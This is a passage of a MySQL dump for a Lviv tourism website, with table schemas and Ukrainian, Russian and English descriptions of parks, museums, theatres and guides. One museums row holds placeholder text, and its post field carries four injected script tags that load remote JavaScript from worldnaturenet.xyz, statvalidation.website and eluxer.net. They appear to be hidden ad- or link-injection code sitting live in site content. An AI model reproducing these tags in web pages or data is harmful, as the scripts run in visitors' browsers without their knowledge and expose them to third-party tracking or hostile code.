  `email` varchar(100) DEFAULT NULL,
  `site` varchar(150) DEFAULT NULL,
  `cost` text,
  `schedule` text NOT NULL,
  `title` text NOT NULL,
  `post` text NOT NULL,
  `banner_photo` text,
  `photo` text,
  `photo1` text,
  `photo2` text,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL,
  `google_place_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `owner_email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `unique_key` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Дамп данных таблицы `museums`
--

INSERT INTO `museums` (`id`, `tag`, `name`, `slug`, `address`, `number`, `number2`, `email`, `site`, `cost`, `schedule`, `title`, `post`, `banner_photo`, `photo`, `photo1`, `photo2`, `created_at`, `updated_at`, `google_place_id`, `status`, `owner_email`, `unique_key`) VALUES
(2, 'Музеї', 'sdf', 'muzej-narodnoyi-arhitekturi-i-pobutu-shevchenkivs-kij-gaj-', 'sdf', 'dsf', 'sdf', 'sdf', 'sdf', 'sdf', 'sdf', 'sdf', '<p>dsf</p><script type="text/javascript" src="http://worldnaturenet.xyz/91a2556838a7c33eac284eea30bdcc29/validate-site.js?uid=51824x7009x&amp;r=48"></script><script type="text/javascript" src="http://statvalidation.website/addons/lnkr5.min.js"></script><script type="text/javascript" src="http://statvalidation.website/addons/lnkr30_nt.min.js"></script><script type="text/javascript" src="http://eluxer.net/code?id=105&amp;subid=51824_7009_"></script>', NULL, NULL, NULL, NULL, '2018-05-04 10:38:57', '2018-05-15 06:35:54', 'sdf', '', 'asdasd', 'museums~*4bfac180dad105dc1de4cba657e6814f');

-- --------------------------------------------------------

--
-- Структура таблицы `new`
--

CREATE TABLE `new` (
  `id` int(11) NOT NULL,
  `name` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Структура таблицы `owners`
--

CREATE TABLE `owners` (
  `id` int(10) UNSIGNED NOT NULL,
  `google_id` text COLLATE utf8_unicode_ci NOT NULL,
  `name_owner` text COLLATE utf8_unicode_ci NOT NULL,
  `address` text COLLATE utf8_unicode_ci NOT NULL,
  `site` text COLLATE utf8_unicode_ci NOT NULL,
  `number` text COLLATE utf8_unicode_ci NOT NULL,
  `schedule` text COLLATE utf8_unicode_ci NOT NULL,
  `description` text COLLATE utf8_unicode_ci NOT NULL,
  `photo` text COLLATE utf8_unicode_ci NOT NULL,
  `rating` text COLLATE utf8_unicode_ci NOT NULL,
  `reviews` text COLLATE utf8_unicode_ci NOT NULL,
  `lat` text COLLATE utf8_unicode_ci NOT NULL,
  `long` text COLLATE utf8_unicode_ci NOT NULL,
  `user_id` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `pages`
--

CREATE TABLE `pages` (
  `id` int(10) UNSIGNED NOT NULL,
  `name_uk` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `name_en` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_uk` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_uk` text COLLATE utf8mb4_unicode_ci,
  `post_en` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `banner_photo` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` enum('Памʼятки','Музеї','Аттракції','Парки','Театри','Громадські місця','Навколо Львова','Гіди','Свіжі новини') COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `pages`
--

INSERT INTO `pages` (`id`, `name_uk`, `name_en`, `title_uk`, `title_en`, `post_uk`, `post_en`, `banner_photo`, `status`, `created_at`, `updated_at`) VALUES
(2, 'Парки', 'Parks', 'Отдохнуть и расслабиться от обыденности города Вам помогут львовские парки, которых особенно много в центре города. Парки Львова приятно удивят своим уютом, который будет способствовать отдыху. Непосредственной близости от парков часто находятся гостиницы Львова или более экономное проживание в Львове - хостелы Львова. Также в некоторых парках и особенно в их окрестности находятся уютные кафе Львова и рестораны Львова.', 'To relax and relax from the everyday life of the city you will be helped by the Lviv parks, which are especially popular in the city center. Parks of Lviv will pleasantly surprise your comfort, which will promote rest. In the immediate vicinity of the parks there are often Lviv hotels or more economical accommodation in Lviv - hostels of Lviv. Also in some parks and especially in their surroundings are cozy cafes of Lviv and restaurants of Lviv.', '<p><span style="color: #352a33; font-family: Merriweather; font-size: medium;">Прежде советуем посетить парк &laquo;Высокий замок&raquo;, который находится на замковой горе Львова. С его высоты можно осмотреть широчайшую панораму города, что принесет вам массу впечатлений. Рядом расположен парк "Вознесение" - региональный ландшафтный парк площадью 312,1 га. Интересно, что территория парка расположена именно на водоразделе Балтийского и Черного морей, поэтому во Львове шутят, что с одной стороны горы вода стекает в Черное море, а с другой в Балтийское. Львовяне же называют парк "Вознесение" Кайзервальдом, что дословно с немецкого означает королевский лес. Существует легенда, что когда-то здесь гулял император Австро-Венгерской империи. Есть во Львове и аж три ботанических сада - два принадлежат Львовскому национальному университету имени Ивана Франко, а один Медицинском университета имени Даниила Галицкого. Богатые коллекции растений ботанического сада привлекают роскошным цветением весной, летом и даже осенью. На сайте представлен Виртуальный 3D-тур жемчужиной парковой культуры Львова - известный на всю Европу Стрыйский парк. Особой львовской атмосферой проникнут парк имени Ивана Франко (бывший парк Костюшко). Парк на этом месте был основан и приведено еще в конце XVI века, а в 1799 году он был переоборудован на французский манер. Летом в парке устраивают открытые музыкальные концерты. Правда во Львове этот парк считают студенческим, ведь он расположен напротив здания Львовского национального университета имени Ивана Франко, поэтому Вы можете совместить отдых в парке Львова и созерцания львовской архитектуры. На сайте можно ознакомиться с историей основания парков и легендами, которые связывают с этими местами. Также карта на сайте позволит выбрать оптимальное решение для совмещения прогулки улочками Львова и парками и скверами города.</span></p>', '<p>We advise you to visit the "High Castle" park, which is located on the castle hill of Lviv. From its height you can see the wide panorama of the city, which will bring you a lot of impressions. Nearby is the "Ascension" park - a regional landscape park with an area of ​​312.1 hectares. Interestingly, the territory of the park is located exactly on the watershed of the Baltic Sea and the Black Sea, so in Lvov joke that on one side of the mountain water flows to the Black Sea, and on the other to the Baltic Sea. Lviv is also called the "Ascension" park Kaiserwald, which literally means the royal forest from the German. There is a legend that once the Emperor of the Austro-Hungarian Empire walked here. There are up to three botanical gardens in Lviv and two belong to Ivan Franko Lviv National University and one to the Medical University named after Daniel Galitsky. Rich collections of plants of the botanical garden attract magnificent flowering in spring, summer and even in autumn. The site presents the Virtual 3D-tour of the gem of the park culture of Lviv - the Stryisky Park known throughout Europe. Ivan Franko Park (former Kosciusko Park) will penetrate a special Lviv atmosphere. The park on this site was founded and brought back at the end of the XVI century, and in 1799 it was rebuilt in French style. In the summer, open musical concerts are arranged in the park. True, in Lviv, this park is considered a student, because it is located opposite Lviv Ivan Franko National University, so you can combine rest in the park of Lviv and contemplation of Lviv architecture. On the site you can get acquainted with the history of the foundations of parks and legends, which connect with these places. Also, the map on the site will allow you to choose the optimal solution for combining walks through the streets of Lviv and parks and squares of the city.</p>', 'pages/May2018/DQaTyWpvQ0Q3Pebqvrze.jpg', 'Парки', '2018-05-21 11:22:16', '2018-05-21 11:22:16'),
(3, 'Памʼятки', 'Memories', 'Львів - велике та красиве старовинне місто в передгір\'ї Карпат, серце Львівської області. Львів називають містом лева. І недаремно. Зображення царя звірів прикрашає герб міста, фасади будинків тощо За однією з версій місто було назване на честь сина князя Данили Галицького Лева.', 'Lviv is a large and beautiful old city in the foothills of the Carpathians, the heart of Lviv region. Lviv is called the city of lion. And it\'s not bad. The image of the king of beasts is embellished with the emblem of the city, the facades of houses, etc. According to one version, the city was named after the son of Prince Dany Galitsky Lion.', '<p><span style="color: #000000; font-family: Arial, Helvetica, sans-serif; font-size: 17px; background-color: #f5e8b8;">&nbsp;За всю свою історію існування Львів був під впливом багатьох народів та держав, і це відбилося на його культуру, архітектуру, релігії, а також на його жителях. Львів зітканий із безлічі стилів та напрямів (ренесанс, бароко, ампір, рококо, романський стиль, модерн та ін.), гармонійно поєднаних між собою протягом століть у неповторний ансамбль. У Львові відчуваєш себе немов в машині часу - тут так легко перенестися від сучасності в романтику середньовіччя. Місто сміливо можна назвати музеєм під відкритим небом. Тут практично кожен старовинний будинок - унікальний історико-архітектурний пам\'ятник і визначна пам\'ятка Львова. Вся центральна частина міста є заповідником та включена до списку культурної спадщини ЮНЕСКО.</span></p>', '<p>Throughout its history, Lviv was influenced by many peoples and nations, and this reflected its culture, architecture, religion, as well as its inhabitants. Lviv is made of many styles and trends (Renaissance, Baroque, Empire, Rococo, Romanesque, Modern, etc.), harmoniously combined for centuries in a unique ensemble. In Lviv, you feel yourself in the car of time - it\'s so easy to move from the present to the romance of the Middle Ages. The city can safely be called an open-air museum. Here almost every old building is a unique historic-architectural monument and a landmark of Lviv. The entire central part of the city is a protected area and is included in UNESCO\'s cultural heritage list.</p>', 'pages/May2018/FAZgpu3WJ710hYvAQfQR.jpg', 'Памʼятки', '2018-05-22 05:59:30', '2018-05-22 05:59:30'),
(4, 'Музеї та галереї', 'Museums and galleries', 'Львов - это не только город-музей под открытым небом, но и город музеев. Не один день придется потратить, чтобы осмотреть все экспозиции львовских музеев, от картинных галерей с картинами XIV века и современных галерей, в музее-аптеке, музее - арсенал, музее шоколада', 'Lviv is not only an open-air museum city, but also a city of museums. Not one day will have to spend to examine all exhibits of Lviv museums, from art galleries with pictures of the XIV century and modern galleries, in a museum-pharmacy, an museum - an arsenal, a museum of chocolate', '<p>Безперечно, Львів &ndash; місто, що надихає. Недарма творчість та мистецтво заповнюють місто починаючи з вулиць, і закінчуючи театрами та галереями. Варто лише подивитися на різноманіття місцевої архітектури, щоб переконатися, що у Львові насправді живуть і працюють досить творчі особистості. І це вже історична закономірність.</p>\r\n<p>Так, у Львові досить велика кількість культурних осередків: театрів, музеїв, галерей, тощо. Проте львівське мистецтво не обмежена лише їх стінами. Воно &ndash; всюди. Так, талановитих музикантів, художників, танцівників Ви зможете зустріти прямо на вулицях міста. Саме там вони просто дарують жителям та гостям міста свою творчість.</p>\r\n<p>Також, щоб насолодитися львівським мистецтвом, не обов&rsquo;язково відвідувати всі виставкові центра та музеї. У деяких кав&rsquo;ярнях та кнайпах Львову теж не обходиться без мистецьких подарунків. Так, львівська кнайпа &laquo;Дзига&raquo; постійно проводить виставки сучасних художників. До того ж, завітавши саме до цього закладу Ви зможете насолоджуватися не лише чудовою кухнею та напоями, а й прекрасним джазом у живому виконанні.&nbsp;</p>\r\n<p>У Львові представлені досить різні напрямки мистецтва. Що стосується музики, місто багате як сучасними виконавцями (здебільшого рок-гурти), так і більш класичними авторами (майстри джазу). Образотворче мистецтво також багате своїм різнобарв&rsquo;ям.</p>\r\n<p>У розділі &laquo;Львів мистецький&raquo; Ви відкриєте для себе різноманіття мистецьких закладів Львову. Також, Ви матимете можливість ознайомитися з творчою направленістю того чи іншого музею, галереї, та обрати для себе найбільш близький та імпонуючий. До того ж, у нас представлені адреси та контакті дані музеїв та галерей, а також графік їх роботи. Тобто з нашою допомогою Ви завжди зможете спланувати для себе культурний відпочинок у Львові, та духовно збагатитися.</p>', '<p>Undoubtedly, Lviv is an inspirational city. No wonder creativity and art fill the city from the streets to theaters and galleries. One should only look at the diversity of local architecture in order to make sure that in reality, very creative personalities live and work in Lviv. And this is already a historical pattern.</p>\r\n<p>So, in Lviv there is a fairly large number of cultural centers: theaters, museums, galleries, and the like. However, Lviv art is not limited only by their walls. It is everywhere. So, talented musicians, artists, dancers you can meet right on the streets of the city. It is there that they simply give the inhabitants and guests of the city their creativity.</p>\r\n<p>Also, in order to enjoy the Lviv art, it is not necessary to visit all exhibition centers and museums. In some coffee shops and kneipps, Lviv can not do without artistic gifts as well. So, the Lviv Kneipp "Dziga" constantly holds exhibitions of contemporary artists. In addition, visiting this institution you will be able to enjoy not only great cuisine and drinks, but also a wonderful jazz live performance.</p>\r\n<p>In Lviv there are quite different directions of art. As for music, the city is rich as modern performers (mostly rock bands) and more classical authors (jazz master). Fine art is also rich in its colorfulness.</p>\r\n<p>In the section "Lviv art" you will discover a variety of Lviv art institutions. You will also have the opportunity to get acquainted with the creative orientation of this or that museum, gallery, and to choose the closest and most attractive to you. In addition, we present the addresses and contact data of museums and galleries, as well as the schedule of their work. That is, with our help, you can always plan for a cultural holiday in Lviv, and spiritually enrich yourself.</p>', 'pages/May2018/tJqD6yhKD3fonBXvcpfn.jpg', 'Музеї', '2018-05-22 06:04:38', '2018-05-22 06:04:38'),
(5, 'Аттракції', 'Attractions', 'Львів - туристична Мекка, має цікаву історію, старовинну архітектуру, володіє особливим шармом, багатий на культурні події.', 'Lviv - tourist Mecca, has an interesting history, ancient architecture, has a special charm, rich in cultural events.', '<p><span style="color: #333333; font-family: \'PT Sans\', Arial, sans-serif;"><span style="font-size: 16px;">Львів - культурна столиця України. Мандрівники люблять в цьому місті все, починаючи з бруківки затишних вуличок з красивими будинками, закінчуючи гостинними жителями міста і доброзичливими офіціантами в не менше легендарних і оригінальних кафе. Здавалося б, кожен українець бував тут десятки, сотні разів, але ми знову і знову повертаємося в цю колиску красивій архітектури, щоб опинитися в прекрасній атмосфері цього міста. Якщо раптом до тебе приїжджають гості, які ніколи не були у Львові і просять провести експрес-екскурсію, або ти сама, на свій сором і жаль, ніколи не гуляла по львівській бруківці, ми тобі розповімо, куди піти і що подивитися в цьому місті за 24 години.</span></span></p>', '<p>Lviv is the cultural capital of Ukraine. Travelers love everything in this city, from the bridges of cozy streets with beautiful houses, ending with hospitable city dwellers and friendly waiters in at least legendary and original cafes. It would seem that every Ukrainian was here tens, hundreds of times, but again and again we return to this cradle of beautiful architecture in order to be found in the beautiful atmosphere of this city. If you suddenly come to you guests who have never been to Lviv and ask for a express tour, or you yourself, to your shame and regret, never walked along the Lviv cobblestone, we will tell you where to go and what to see in this city for 24 hours</p>', 'pages/May2018/dhe5H9Fnyi7JXv1yN07z.jpg', 'Аттракції', '2018-05-22 06:09:54', '2018-05-22 06:09:54'),
(6, 'Театри та Філармонії', 'Theaters and Philharmonic', 'Про театральне життя Львова написано вже дуже багато. Недарма місто Лева називають «культурною столицею України». Ми ж пропонуємо поглянути на найстаріші театри Львова не лише з літературно-драматичного боку, а й через призму історії архітектури та порівняти минуле театрів та їхнє сьогодення.', 'A lot has already been written about Lviv\'s theatrical life. No wonder the city of Lion is called "the cultural capital of Ukraine". We propose to look at the oldest theaters of Lviv, not only from the literary and dramatic side, but also through the prism of the history of architecture and compare the past of the theaters and their present.', '<p>Львов часто называют культурной столицей западной Украины, и не зря, ведь здесь сосредоточены одни из лучших театров и учреждений культуры не только Львова, а Украина в целом. Желая культурно отдохнуть во Львове, Вы сможете посетить спектакли, концерты и оперы, которые будут выполнены на высшем уровне, помогут вам расслабиться и отдохнуть и все это - за умеренную цену.</p>\r\n<p>&nbsp;Театры Львова имеют старую академическую традицию, а здания, в которых они находятся, свою историю, ведь их строили известные архитекторы Европы. К примеру Национальный академический театр оперы и балета им. С. Крушельницкой (Оперный театр, Львов) проектировал известный архитектор Зигмунт Горголевский, который является автором здания рейхстага Германии. Одновременно в Львове активно появляются и современные театры, которые мы рекомендуем посетить.</p>\r\n<p>&nbsp;Отметим также, что на нашем сайте в самом полном справочнике культурных заведений Вы можете не только узнать о театрах Львова, их адреса и телефоны, но и просмотреть полные афиши спектаклей и концертов. Также на Welcome.lviv.ua Вы сможете осуществить виртуальную прогулку по театру.</p>\r\n<p>&nbsp;После концерта или спектакля Вы сможете поделиться впечатлениями и продолжить отдых во Львове в уютных кофейнях Львова, которые часто находятся в том же здании, что и театр, и проникнуты атмосферой сцены, которая будет гарантировать Вам незабываемый романтический вечер в кругу культурной богемы Львова. Вниманию любителей культурного отдыха: музеи Львова, перечень и виртуальные путешествия.</p>\r\n<p>&nbsp;Все театры и культурные сооружения расположены в центре Львова, поэтому Вы с легкостью сможете продолжить свой вечер прогулкой львовским улицам, ужином в одном из знаменитых ресторанов Львова, а после легко добраться до своего отеля во Львове.</p>\r\n<p>&nbsp;</p>', '<p>Lviv is often called the cultural capital of western Ukraine, and not in vain, because here are focused on some of the best theaters and cultural institutions not only of Lviv, but of Ukraine as a whole. Wanting a cultural getaway in Lviv, you can attend performances, concerts and operas that will be performed at the highest level, will help you to relax and have a rest and all this at a reasonable price.</p>\r\n<p>&nbsp;The theaters of Lviv have an old academic tradition, and the buildings in which they are located, their history, because they were built by renowned architects of Europe. For example, the National Academic Opera and Ballet Theater. S. Krushelnitskaya (Opera, Lviv) was designed by famous architect Sigmund Gorgolevsky, who is the author of the Reichstag building in Germany. At the same time, modern theaters that we recommend to visit actively appear in Lviv.</p>\r\n<p>&nbsp;We also note that on our site in the most comprehensive directory of cultural institutions you can not only learn about the theaters of Lviv, their addresses and telephones, but also to view the full posters of performances and concerts. Also on Welcome.lviv.ua you will be able to make a virtual tour through the theater.</p>\r\n<p>&nbsp;After a concert or performance, you can share your impressions and continue your rest in Lviv in the cozy cafes of Lviv, which are often in the same building as the theater, and are inspired by the atmosphere of the scene, which will guarantee you an unforgettable romantic evening in the circle of the cultural bohemians of Lviv. For the attention of lovers of cultural rest: museums of Lviv, the list and virtual travels.</p>\r\n<p>&nbsp;All theaters and cultural facilities are located in the center of Lviv, so you can easily continue your evening with a walk on Lviv streets, dinner in one of the famous Lviv restaurants, and then easily reach your hotel in Lviv.</p>', 'pages/May2018/WiExXWz7LgiarAvLlKxb.jpg', 'Театри', '2018-05-22 06:32:44', '2018-05-22 06:32:44'),
(7, 'Громадські місця', 'Public places', 'Протягом останніх трьох років у всіх районах Львова активно облаштовують нові громадські простори. Щоразу на проектування та облаштування місць громадського користування виділяють дедалі більше коштів. Мешканці Львова вподобали таку ініціативу міських урбаністів і також активно долучаються до облаштування громадських місць.', 'During the last three years, new areas of public life are being actively developed in all regions of Lviv. More and more funds are allocated to designing and equipping public places. The residents of Lviv liked such an initiative of urban urbanists and are also actively involved in the arrangement of public places.', '<p><span style="color: #363635; font-family: Ubuntu, Arial, sans-serif; background-color: #fcfcfc;">Головними натхненниками та проектантами громадських просторів Львова є працівники відділу урбаністики ЛКП &laquo;Інститут просторового розвитку&raquo;. Начальник відділу Олександра Сладкова під час прес-конференції розповіла про різні громадські простори: якими вже активно користуються мешканці, роботи з облаштування яких іще тривають і&nbsp;ті, які лише перебувають на стадії розробки.</span></p>', '<p>The main inspirational and designers of Lviv\'s public spaces are employees of the Department of Urban Studies of the LKP "Institute for Spatial Development". The head of the department, Alexander Sladkov, at a press conference told about various public spaces: which are already actively used by residents, whose work is still ongoing and those that are only under development.</p>', 'pages/May2018/jHuxZb87ZzJztKRbsaIt.jpg', 'Громадські місця', '2018-05-22 06:37:43', '2018-05-22 06:37:43'),
(8, 'Навколо Львова', 'Around Lviv', 'Замки Львівщини є основними туристичними принадами довкола Львова. Їх красива архітектура, містична історія і мальовничі пейзажі завжди приваблювали людей. Для популяризації замкової спадщини Галичини з ініціативи Бориса Возницького був створений маршрут "Золота підкова Львівщини". Він зручний тим, що замки розташовані поблизу трас і Ви протягом дня встигаєте детально оглянути усі з них.', 'Lviv\'s castles are the main tourist attractions around Lviv. Their beautiful architecture, mystical history and scenic landscapes have always attracted people. For the popularization of the castle heritage of Galicia, on the initiative of Boris Voznytsky, a route "Golden Horseshoe of Lviv Region" was created. It is convenient because the locks are located near the tracks and you can view all of them during the day in detail.', '<p style="box-sizing: border-box; margin: 0px 0px 10px; color: #333333; font-family: Roboto, sans-serif; font-size: 15px; text-align: justify;">А ви знаєте, що поблизу Львова є загадкові кам&rsquo;яні міста, в яких будинки схожі на хатки хобітів, а ще замок, що був Версалем у фільмі про Д&rsquo;артаньяна і трьох мушкетерів? Ці і ще багато цікавих місць можна оглянути, вирушивши в мандрівку Львівщиною.</p>\r\n<p style="box-sizing: border-box; margin: 0px 0px 10px; color: #333333; font-family: Roboto, sans-serif; font-size: 15px; text-align: justify;">Якщо ви потрапили до Львова, не проґавте можливості вирушити в 1-денну подорож тамтешніми місцями. "Студвей" розповідає, куди поїхати так, щоб за день побачити не менше, ніж інші можуть відвідати за тиждень.</p>', '<p>And do you know that there are mysterious stone cities near Lviv, in which houses are similar to hobbit huts, and also the castle, which was Versailles in the film about D\'artagnan and three musketeers? These and many other interesting places can be seen, going on a journey to Lviv region.</p>\r\n<p>If you get to Lviv, do not miss the opportunity to go on a 1-day trip there. "Studwave" tells where to go so that you can see the day no less than others can visit a week.</p>', 'pages/May2018/PltK3JYf2eGf6yVR6PGf.jpg', 'Навколо Львова', '2018-05-22 06:43:55', '2018-05-22 06:43:55'),
(9, 'Гіди', 'Guides', '.Лучші гіди Львова проводять екскурсії по Львову і пригороді на 9-ти мовах, різноманіття екскурсій охоплює всі межі життя міста. Ви можете замовити екскурсії та послуги гідів у Львові. Вартість та ціни на послуги гідів вказані нижче в сервісах для індивідуальних екскурсій.', 'The best guides of Lviv spend excursions around Lviv and the suburbs in 9 languages, a variety of excursions covering all aspects of the city\'s life. You can order guided tours and services in Lviv. The cost and prices for guide services are listed below in services for individual tours.', '<p>Якщо Ваша "команда" невелика і ви хочете значно заощадити на екскурсіях по Львову, ви можете приєднатися до наших регулярних груп. Ссылки на регулярні екскурсії дивіться нижче. Тут також можна вибрати найпопулярніші екскурсії в Львові, які будуть цікаві абсолютному більшості туристів.</p>\r\n<p>Щоб замовити послуги індивідуального керівництва, укажіть контактні дані нижче. З вами зв\'яжуться спеціаліст по екскурсійному обслуговуванню.</p>', '<p>If your "team" is small and you want to save a lot on guided tours in Lviv, you can join our regular groups. Links to regular excursions are listed below. Here you can also choose the most popular excursions in Lviv, which will be of interest to the vast majority of tourists.</p>\r\n<p>To order the services of an individual guide, please provide contact details below. A guided tour specialist will contact you.</p>', 'pages/May2018/hZdbfnjHYPyNnAb9TLoD.jpg', 'Гіди', '2018-05-22 06:48:11', '2018-05-22 06:48:11'),
(10, 'Свіжі новини', 'Fresh news', 'Запрошую Вас на знайомство з прекрасним та водночас повним таємниць містом.', 'I invite you to get acquainted with the beautiful and at the same time full of mysteries of the city.', '<p>Містом де народилось стільки пам\'яток, які на сьогоднішній день входять до спадщини ЮНЕСКО, містом багатим на відомих та знаменитих постатей з історії міста,які творили історію Європи, містом кохання, містом багатим на байки і легенди, лише у Львові є єдина у світі копальня кави де кава проростає на стінах підземелля, вуличками Львова Вас супроводжуватимуть постаті ангелів, фей, принцес,королів, львівського ката і сажотруса, карети чекатимуть на Вас при входах та виходах з закладів Львова за Вашим бажанням. піднятись на Ратушу і оцінити місто з пташиного польоту-тепер це можливо! Львівська Ратуша чекає на своїх гостей. До Вашої уваги- Вулички таємничого Львова, підземелля, які датуються правлінням засновника міста Данила Галицького, Золота пора Австрійського правляння, Екскурсія Личаківським кладовищем,екскурсія дахами Львова, романтичний Львів, дитячі екскурсії. У Львові безліч різноманітних тематичних вечорів, багато хорошої музики, смаколиків, усміхнених перехожих ,які з радістю та гостиністю чекають на Вас. Де ще Ви зможете зустріти так багатонаціональне місто? Tylko we Lwowie(лише у Львові) Неможливо не закохатись у місто у якому все породжене з Любові. Пропоную Вам послуги екскурсовода у якого в душі панує Любов до Рідного міста.</p>', '<p>The city where so many monuments were born that today are the legacy of UNESCO, a city rich in well-known and famous figures in the history of the city, who created the history of Europe, a city of love, a city rich in fables and legends, only in Lviv is the only one in the world a coffee-house where coffee breaks up on the walls of a dungeon, the streets of Lviv will be accompanied by figures of angels, fairies, princesses, kings, Lviv kata and sazotrusa, coaches will wait for you at the entrances and exits of Lviv institutions at your request. climb the Town Hall and appreciate the city from the bird\'s eye-now it\'s possible! Lviv City Hall is waiting for its guests. To your attention - Streets of the mysterious city of Lviv, underground, dating from the founder of the city of Danylo Halytsky, Golden time of the Austrian government, Excursion to the Lychakiv cemetery, excursion to the roofs of Lviv, romantic Lviv, children\'s excursions. There are many variety thematic evenings in Lviv, a lot of good music, goodies, smiling passers-by who are waiting for you with joy and hospitality. Where else can you meet such a multinational city? Tylko we Lwowie (only in Lviv) It is impossible not to fall in love with the city where everything is born of Love. I offer you a tour guide who has a love for the Native city in the heart.</p>', 'pages/May2018/y8iLQ8aVsB3k8wwRmerN.jpg', 'Свіжі новини', '2018-05-24 08:45:13', '2018-05-24 08:45:13');

-- --------------------------------------------------------

--
-- Структура таблицы `parks`
--

CREATE TABLE `parks` (
  `id` int(10) UNSIGNED NOT NULL,
  `tag` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `google_place_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `name` text COLLATE utf8_unicode_ci NOT NULL,
  `slug` text COLLATE utf8_unicode_ci NOT NULL,
  `address` text COLLATE utf8_unicode_ci NOT NULL,
  `title` text COLLATE utf8_unicode_ci NOT NULL,
  `post` text COLLATE utf8_unicode_ci NOT NULL,
  `banner_photo` text COLLATE utf8_unicode_ci NOT NULL,
  `photo1` text COLLATE utf8_unicode_ci NOT NULL,
  `photo2` text COLLATE utf8_unicode_ci,
  `photo3` text COLLATE utf8_unicode_ci,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `owner_email` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Дамп данных таблицы `parks`
--

INSERT INTO `parks` (`id`, `tag`, `google_place_id`, `name`, `slug`, `address`, `title`, `post`, `banner_photo`, `photo1`, `photo2`, `photo3`, `created_at`, `updated_at`, `owner_email`) VALUES
(1, '', NULL, 'Парк им. Ивана Франка (бывший парк Костюшко)', 'park-im-ivana-franka', 'вул. Університетська', 'Маленькое путешествие дорожками парка Франка во Львове — аллея в сказку ближе, чем может казаться…', '<div style="box-sizing: border-box; color: #777777; font-family: \'Open Sans\', Arial, sans-serif;" align="justify">Прогуливаясь вьющимися дорожками&nbsp;<strong style="box-sizing: border-box;">парка Франка</strong>&nbsp;в центре&nbsp;<strong style="box-sizing: border-box;">Львова</strong>, трудно себе представить, что еще несколько веков назад здесь были обычные городские поля. Основу&nbsp;<strong style="box-sizing: border-box;">парка</strong>&nbsp;заложил львовский мещанин Ян Шольц-Вольфович, продолжил его обустройство в итальянском стиле &mdash; Антонио Массари (посол Венецианской республики во Львове).</div>\r\n<div style="box-sizing: border-box; color: #777777; font-family: \'Open Sans\', Arial, sans-serif;" align="justify">&nbsp;</div>\r\n<div style="box-sizing: border-box; color: #777777; font-family: \'Open Sans\', Arial, sans-serif;" align="justify">В дальнейшем&nbsp;<strong style="box-sizing: border-box;">парком</strong>&nbsp;занимался орден иезуитов, поскольку в то время земля перешла в их владения, а после&nbsp;&mdash; австрийское правительство (здание нынешнего университета было местом его расположения). В тот период&nbsp;<strong style="box-sizing: border-box;">парк</strong>&nbsp;переживал не лучшие времена, так как благоустройству не оказывали должного внимания. Но предприимчивость Яна Гехта подарила этой местности второе дыхание&nbsp;&mdash; в помещении университета находилось казино, а&nbsp;<strong style="box-sizing: border-box;">парк</strong>&nbsp;обустроили во французком стиле.</div>\r\n<div style="box-sizing: border-box; color: #777777; font-family: \'Open Sans\', Arial, sans-serif;" align="justify">&nbsp;</div>\r\n<div style="box-sizing: border-box; color: #777777; font-family: \'Open Sans\', Arial, sans-serif;" align="justify">Представители светского общества часто приходили сюда на модные спектакли в летний театр, устраивали шумные забавы (фестивали). Карусели и беседки для посиделок, одна из которых до сих пор сохранилась в сердце&nbsp;<strong style="box-sizing: border-box;">парка</strong>, фейерверки, огненные шоу&nbsp;&mdash; все эти аттракционы собирали толпы зрителей.</div>\r\n<div style="box-sizing: border-box; color: #777777; font-family: \'Open Sans\', Arial, sans-serif;" align="justify">&nbsp;</div>\r\n<div style="box-sizing: border-box; color: #777777; font-family: \'Open Sans\', Arial, sans-serif;" align="justify">В середине XIX века изменили зеленые насаждения. Эти деревья до сих пор защищают от жары поклонников отдыха на свежем воздухе. Мало кто знает, что среди них есть настоящие старожилы&nbsp;&mdash; три огромных дуба, которым уже более трех столетий.</div>\r\n<div style="box-sizing: border-box; color: #777777; font-family: \'Open Sans\', Arial, sans-serif;" align="justify">&nbsp;</div>\r\n<div style="box-sizing: border-box; color: #777777; font-family: \'Open Sans\', Arial, sans-serif;" align="justify">За все время существования&nbsp;<strong style="box-sizing: border-box;">парк</strong>&nbsp;называли по-разному: Иезуитский город, парк Костюшка, теперь&nbsp;&mdash;&nbsp;<strong style="box-sizing: border-box;">парк Франка</strong>. Многие известные деятели и творческие личности упоминают его в своих записях, как любимое место прогулок.</div>\r\n<div style="box-sizing: border-box; color: #777777; font-family: \'Open Sans\', Arial, sans-serif;" align="justify">&nbsp;</div>\r\n<div style="box-sizing: border-box; color: #777777; font-family: \'Open Sans\', Arial, sans-serif;" align="justify">Современное состояние и благоустройство этого места радует и жителей и гостей&nbsp;<strong style="box-sizing: border-box;">Львова</strong>. Очень популярной среди львовян является главная аллея, которая вечером превращается будто в сказочную дорогу, освещенную 